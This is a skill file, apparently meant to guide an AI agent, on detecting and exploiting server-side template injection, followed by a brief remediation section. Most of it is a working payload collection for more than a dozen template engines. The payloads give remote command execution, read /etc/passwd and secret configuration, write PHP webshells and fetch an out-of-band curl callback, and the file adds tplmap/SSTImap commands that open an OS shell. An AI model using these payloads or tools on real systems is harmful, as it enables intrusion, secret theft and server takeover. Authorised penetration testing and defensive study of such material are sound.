---
name: ssti
description: Detect, exploit, and remediate Server-Side Template Injection (SSTI) across Jinja2, Twig, ERB, Smarty, Mako, Velocity, and FreeMarker, including full sandbox escapes and RCE chains.
---

# SSTI (Server-Side Template Injection)

## When to use this skill

Use when user-controlled input is reflected into server-rendered templates: page content, email templates, PDF/invoice generators, CMS fields, error pages, i18n strings, marketing/personalization params, or any endpoint whose output changes when template syntax (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) is injected. Trigger this skill when a target renders user data server-side, when a web framework is known (Flask/Django, Symfony, Rails, JSP/Velocity, Pebble, Thymeleaf), or when WAF blocks obvious payloads and fuzzing is needed.

## Methodology

### 1. Detect template injection

Inject a polyglot math probe that every engine evaluates differently, then compare reflected output:

```
${7*7}          → 49 in Twig, Smarty, FreeMarker, Velocity, Mako, JSP EL
{{7*7}}         → 49 in Jinja2, Twig (double-brace), Nunjucks, Jelly
<%= 7*7 %>      → 49 in ERB (Ruby), EJS
${{7*7}}        → 49 in Handlebars (via helper), some JS engines
#{7*7}          → 49 in Ruby, Thymeleaf, Pug/Jade variants
```

Probe set to fire at a parameter (log which syntax returns 49):

```
{{7*7}} ${7*7} <%= 7*7 %> ${7*7*7} {{7*'7'}} ${T(java.lang.Math)} <%- 7*7 %> #set($x=7*7)${x}
```

Distinguish SSTI from plain XSS: `{{7*7}}` rendered literally = not vulnerable; rendered as `49` = SSTI. For blind SSTI (no reflection), use time-based or out-of-band probes:

```
{{7*7}} in a field → then check a second field that renders the same object
ERB:  <%= sleep(10) %>           Flask/Jinja2: {{ ''.__class__.__mro__[2].__subclasses__() }}
Time: {% for i in range(99999999) %}x{% endfor %}   (template-level CPU burn)
```

### 2. Identify the template engine (decision tree)

Send `{7*7}` and record the response, then follow the tree:

```
{{7*7}} → 49?      YES → Jinja2 / Twig / Nunjucks / Jelly
{{7*'7'}} → 7777777?  YES → Jinja2 (Python)   |  49 → Twig (PHP) or Nunjucks (JS)
${7*7} → 49?       YES → Smarty / FreeMarker / Mako / Velocity / Pebble
${"z".concat("z")} → "zzz"?  YES → FreeMarker (Java)
<%= 7*7 %> → 49?   YES → ERB (Ruby)
#{7*7} → 49?       YES → Thymeleaf / Pug
{{constructor.constructor('return 7*7')()}} → 49?  YES → Nunjucks / EJS / doT (JS)
```

Rapid per-engine confirmations:

```
Jinja2:      {{ ''.__class__ }}        → <class 'str'>
Twig:        {{ _self }}               → template object; {{ ['id']|filter('system') }}
Smarty:      {system('id')}            (v3 security off) or {$smarty.version}
FreeMarker:  ${7*7} then ${"freemarker.template.utility.Execute"?new()("id")}
Velocity:    #set($x=7*7)$x  and  $class.inspect("java.lang.Runtime")
Mako:        ${7*7} then ${__import__("os").popen("id").read()}
ERB:         <%= 7*7 %> then <%= system("id") %>
Jinjava:     {{7*7}} works, objects restricted → context-restricted sandbox
Django:      {{ settings.SECRET_KEY }} (Django has no raw eval; read context vars only)
```

### 3. Exploit Jinja2 (Python) — full RCE chain

Standard escalation chain from a bare string object to `os` module via MRO + subclasses:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}        # enumerate index of os._wrap_close / subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() }}
```

Compact RCE without knowing the index:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
```

WAF bypasses (underscore/attribute filtering):

```
{{ ''|attr('__class__') }}                # attr filter instead of dot
{{ [''|join]|map('.__class__')|first }}   # map trick
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}    # hex-escaped underscores
{% set x = {'':'__class__'}[''] %}        # string-building for filtered chars
{{ config }}                               # leak SECRET_KEY, DB URIs, env vars
```

Read arbitrary files:

```
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['sys'].modules['os'].popen('cat /flag').read() }}
```

### 4. Exploit other engines

```
Twig (PHP) <3.1.1:  {{ ['id']|filter('system') }}
Twig (PHP) 3.x:     {{ ['id']|map('system') }}  /  {{ ['id','cat /flag']|sort('system')|join('') }}
Twig w/o filters:   {{ 'id'|replace('REPLACE', 'system') }}  no — use:
                    {{ app.request.server.get('DOCUMENT_ROOT') }}   (info leak)
                    {% include '//etc/passwd' ignore missing %}      (LFI-ish)
Smarty:             {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}
                    or v3 SAFEMODE-OFF: {system('id')}
FreeMarker (Java):  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
                    ${""?new()("id")}  variants;  <#include "/etc/passwd">
Velocity (Java):    #set($s='')#set($str=$s.class.forName('java.lang.String'))
                    #set($rt=$str.class.forName('java.lang.Runtime'))
                    #set($ex=$rt.getMethod('exec',$str.class).invoke(null,'id'))
                    #set($in=$ex.getInputStream())$in.read()... (byte loop for output)
Pebble (Java):      {% set cmd = 'id' %}{% set bytes = (1).TYPE
                    .forName('java.lang.Runtime')...  (same RT reflection chain)
ERB (Ruby):         <%= system("id") %>   <%= `id` %>   <%= IO.readlines('/etc/passwd') %>
Mako (Python):      ${__import__("os").popen("id").read()}
Jade/Pug (Node):    #{7*7}  and  -var x = global.process.mainModule.require('child_process').execSync('id')
Nunjucks/EJS (JS):  {{constructor.constructor('return process.env')()}}
                    <%= process.mainModule.require('child_process').execSync('id') %>
Handlebars (JS):    {{#with "s" as |string|}}{{#with "e"}}{{this.pop}}{{this.pop}}
                    ... (classic sandbox escape chain to require('child_process'))
Thymeleaf (Java):   __${T(java.lang.Runtime).getRuntime().exec('id')}__::x
                    (double-underscore preprocessing bypass, works in fragment expressions)
Freemarker OOB:     <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://oob/$1")}
```

### 5. Automated exploitation

```
tplmap -u 'http://target/?name=*' --os-shell                     # auto-detect + RCE across engines
tplmap -u 'http://target/' -d 'user=*' --engine jinja2 -e        # force engine
tplmap -u 'http://target/?name=*' --os-cmd 'cat /flag'
SSTImap -u 'http://target/?q=*' --os-shell                       # maintained fork, more engines
curl 'http://target/?name={{7*7}}' | grep 49                     # quick manual confirm
```

For blind/partial-reflection targets, send one probe per request and diff response length or timing; log the winning syntax before escalating.

### 6. Escalation and chaining

- **Sandbox escapes**: Jinja2 sandbox (`jinja2.sandbox`) blocks attribute traversal → use `|attr` with unicode escapes, or leverage only exposed "safe" globals (`config`, `cycler`, `namespace`) to reach `__globals__`.
- **Python 2 vs 3**: `__mro__[2]` (P2) vs `__mro__[1]` (P3) for the object base; adjust subclass indices.
- **Chain with file-write → RCE**: if `exec` is blocked but file write works, template-write a `.php`/`.jsp` webshell or overwrite a template file that is rendered on next request.
- **Secret extraction**: `{{ config }}`, `{{ settings }}`, `{{ request.META }}` (Django) often leaks `SECRET_KEY`, API keys, DB creds → pivot to session forgery (see `sqli`/`jwt-attacks` chain).
- **Java engines**: runtime exec returns no stdout — redirect to a file (`exec('sh -c "id > /tmp/o"')`) and read it, or use `ProcessBuilder` with `RedirectOutput`.
- **Blind → confirmed**: use `sleep`-equivalents (Python `time.sleep`, Java `Thread.sleep`) or OOB DNS/HTTP to a host you control.

## Verification & Deliverables

- **Confirmed SSTI**: exact engine identified via decision tree (e.g. `{{7*'7'}} → 7777777` = Jinja2), with raw request/response pairs showing math evaluation and one command with proof of execution (`id`, `whoami`) or file read (`/etc/passwd`).
- **Impact**: RCE as web service user, credential/secret exfiltration, internal network pivot. Note sandbox status (sandboxed template → context leak only).
- **Remediation**: never pass user input through `render_template_string` / raw template compile — use data placeholders (`render_template('tpl.html', name=user_input)`); keep template sandboxes updated (Jinja2 SandboxedEnvironment, Twig sandbox policy, Handlebars `noEscape:false` avoided); block template syntax in user-facing fields via validation `[^{}$<%#]+`; log and alert on `{{`, `${`, `<%`, `#{` sequences in input.
- **Artifacts**: engine fingerprint table, working payload per engine, tplmap/SSTImap output, remediation diff example showing safe vs unsafe render call.
